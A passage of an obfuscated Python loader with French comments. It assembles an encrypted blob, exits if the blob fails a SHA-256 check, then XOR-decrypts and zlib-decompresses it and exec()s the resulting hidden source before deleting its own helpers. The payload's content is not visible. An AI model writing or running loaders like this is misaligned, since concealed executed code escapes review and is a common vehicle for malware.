_cz0U2iMsz_Rngv + _ctjYArbcwKX1bA + _cs8iFycPv92PGg + _cmE_CWyLKGC3at + _ck0s632p1mEGwF + _ch20JHPOIqtu8k + _ccJkpAFVklDoNb + _cySXCjz0pCl3C5 + _cc9Trzaf3OzMC_ + _cdcOOE9PUfG8iy + _cvNmBKjF0WEWPs + _cywGPQYYleKw_u + _ceR2sdNNT80WVY + _cy1zvQ2ud79aM3 + _czjHivih3IfdSG + _ciXpesdRtGo0eO + _cxMqKu9L4ukoUh + _crrztmwwCNAHt2 + _cdcIa9Bkl8jtME + _ciLaGd81TGH6vu + _ceKkcXYZ8g2sFz + _cgakblDAO4ms2J + _cquULmFpbNrnKk + _ckbHtLlBc_FmiM + _ciwaslZ1IJn6ph + _cwvrn1oZksXpEk + _cgah253zaxXlhE + _ctgC5zkKL9ag2o + _ck9ypfoMn8DXNs + _cjXZSbfEYb1X6q + _c_XQ8n5L84FI8I + _cknvYT_5vanCiM + _csHGw8cZU9_uzU + _ccH06kF3D6vok2 + _cd9zh8kky8pk5H + _cb0pMOCnzXXZRE + _cpdNkH_GxZUeEl + _cfXFvj_CtV0n1c + _cvj1og4Bbjf7PQ + _cyAUAHP9JChIvr + _crLK1qiLRDVe_U + _cmVSrbxX5dCHYA + _cefJIFMQblLrWQ + _cy3vGI1VB94TiG + _cfCfaea4fwstd1 + _chg22ZqOzWqeEe + _chJmmPpaiWKz8o + _cdXyhdDNtZisjB + _cobmV6GZubJziz + _ceDOtUjKzlkgV7 + _cw8sSoULyKWa7_ + _crkyuPJmj1Hqrm + _clgf83kAtZxjos + _cnMzMPRuL0sMr3 + _cr2QcGGNZBNwzg + _coLzGvd3oHWdk9 + _cuDV6zmqhUbW6X + _csKWlefCobNuXS + _cnYW77Q3n2xAQ1 + _cs66wcoGmZxGLv + _cskdzUXFhst6Za + _csLU8thTutzpLi + _cinslp33sP9w3R + _cePlwFVVYGoQev + _cnP8SPWgZ7zVEF + _ctVDxhOgDtbKM8 + _c_aI5KC891YDjO + _cf5EUOzWkHa3RQ + _cb28mvsTZBK8xL + _crMX5JAXopEmUG + _csmYaSvS5GX47M + _cjPf8tqHCUeX5w + _cyUkFistjxmHQu + _caeXxrlgXKa9td + _cyXWYV8Tg3G1MZ + _cdBp3ngHD8lLEo + _cpmz2EyCMgR5oa + _cnPppUBh95WR3S + _cbWNW3ENlpwp2G + _cxty5p7ebcK_lH + _cd2qhPVqjDYepw + _cplduJYhmPqfAg + _crZs5x_B9vFqGs + _cwTuFC1bKzTO3B + _ceyJBkQGYVi6bv + _cnDWUpnzrnvq8Z + _cg_QuRpFZhIeU6 + _cz4CrPUSvlu4aQ + _cqVKQImvK5oYpQ + _cn3b4BTk_2ppOt + _cfUDNtQO6gwd3E + _cgoA1beyVEQEVl + _caqnOxbvzCTOUU + _cp5_gyzb_yq93n + _cruppiZ3sAsfNs + _cpxKI3M2Eofgq_ + _cjHt9Ro36TZq2R + _cqUf12ZVagEGH8 + _cgmiW97cQGMAXr + _cdHrJ_uvDSa_CS + _ch99tW9YEVV2RT + _cfyVTWClXHjgVq + _cr0nylhBHZoclF + _cuj5m3iXvf1FnJ + _cedwguVDJLJ1Ui + _ci3grZOgsW80Zu + _cyEicbYxgzFbEd + _coLQdimE_HYiF7 + _ce3RpA7iVhRxzN + _cwlSYr4MUWqwRU + _ckwj675LwxtHZT + _cxiwDTZU9ulsYC + _chC8IArvrAZqkk + _ca07bIXjQh6Dsw + _cxf29UYMMntCKv + _ckEu3ktYDqJkxN + _cpHgioT8n5kekd + _cxLEoi_Qy8o6hv + _cwRRVcoV2LE5eD + _ckNkCllER00ZIt + _cnL_xMX7SBPlPb + _crzxyYnMAuaTMu + _chGXDiVIHWDbik + _chTehfN9tHjijz + _cqYj67MpSJf9yh + _clNp_r2Q7Gg4bQ + _cmOEja67JyorV3 + _cc7E9TfI2GrQM0 + _clYHXbu70rEIoj + _czR02k0X1Sf3aP + _cjLIy92GZlfQci + _cbdoBuVgkTsk6h + _cqyEP920gYhUcT + _chJt43nWVfuEu7 + _c_ZNuMjKyWBl7w + _cpJZZIge8MNXsQ + _cylw4CPA0pAOGi + _crEp9d96fdZ_EE + _c_puK9BCVpMMmz + _chKYjrN8UowB5O + _crFItJIqZuyuwA + _crnVpR_YGFUo38 + _cnkar7pnA01wvI + _cq0vwcLMUZPrnQ + _ch5O7h1uAyqPgn + _cxYMvBObxVffVD + _caQNAXF1lK5hkf + _cq3Do2g_QqNZRd + _cmBW1r72ui5qkb + _cnFnfXy0yZDZ8v + _cxDWHQvgqKi80i + _cgmyNld8jlew99 + _cmifbZ04Sa0BVs + _can7MjqOTSK1xj + _czwiXDig9SIst7 + _cki6A1h3XaCnLu + _coYbxzBV2vFSeo + _czsvFj_Y_bb9XM + _cz3DTgWLGPR_m4 + _cmFEhxa4IpTY9X + _cqX9vqlm7dwdeV + _cxBRbmH4Vn34yT + _co3wVKOps_RSgB + _cwRNiluuaW8zqs + _cqbpUbG3sBGGUS + _ch3Hihr2LPa8yf + _ceMtE6b1LnGkax + _cpRJ2Fhw1C70fT + _c_vD7SFwDpXAdz + _cpwIEgAcZgYMB9)
if __import__('hashlib').sha256(_poy9Xo10YXbSjQ).hexdigest() != '73fe2b5c64b9b38f49e1da2f782cd1fe7bb439c78b685bed6e5f173fd1d11f87':
    __import__('sys').exit(1)
_xv_9iVnnjkP2eZ = bytes([33, 34, 156, 63, 198, 22, 235, 243, 186, 110, 44, 248, 128, 65, 60, 240, 159, 164, 22, 108, 164, 171, 78, 108, 150, 114, 129, 241, 7, 39, 78])
_fkxjDKuYZvVksjo = bytes([212, 6, 199, 247, 250, 12, 19, 16, 17, 119, 12, 213, 130, 64, 70, 54, 159, 155, 196, 189, 44, 86, 110, 166, 130, 61, 19, 180, 54, 108, 187])

def _fxuG5zUYsMGuTee(_b_lUhhA1BtxBf4, _kybCe3w_p0PL4B):
    return bytes(_b_lUhhA1BtxBf4[_ianPVBEdsPLUmz] ^ _kybCe3w_p0PL4B[_ianPVBEdsPLUmz % len(_kybCe3w_p0PL4B)] for _ianPVBEdsPLUmz in range(len(_b_lUhhA1BtxBf4)))

def _fdaD5kmQbr7RuKs(_tdoTRICqRR7wj4):
    import zlib
    return zlib.decompress(_tdoTRICqRR7wj4) # Un seul niveau de zlib ici pour simplifier

def _fevB9YoXSi4WQCi():
    import sys, builtins
    # 1. Déchiffrement XOR
    _xtCnf2RM1pF5Z7 = _fxuG5zUYsMGuTee(_poy9Xo10YXbSjQ, _xv_9iVnnjkP2eZ)
    # 2. Décompression Zlib
    _dmk9dRrK34T2yK = _fdaD5kmQbr7RuKs(_xtCnf2RM1pF5Z7)
    # 3. Conversion bytes -> string (C'est là la différence clé !)
    source_code = _dmk9dRrK34T2yK.decode('utf-8')
    
    # 4. Préparation de l'environnement
    _main = sys.modules['__main__']
    _n_UkvVYzmuiROh = _main.__dict__
    _n_UkvVYzmuiROh.setdefault('__builtins__', builtins)
    
    # 5. Exécution directe du code source
    # On compile à la volée, ce qui marche sur n'importe quelle version de Python
    try:
        exec(source_code, _n_UkvVYzmuiROh)
    except Exception as e:
        print(f"Erreur fatale: {e}")
        sys.exit(1)

_fevB9YoXSi4WQCi()
try:
    del _fxuG5zUYsMGuTee, _fdaD5kmQbr7RuKs, _fevB9YoXSi4WQCi
    del _poy9Xo10YXbSjQ, _xv_9iVnnjkP2eZ, _fkxjDKuYZvVksjo
except:
    pass
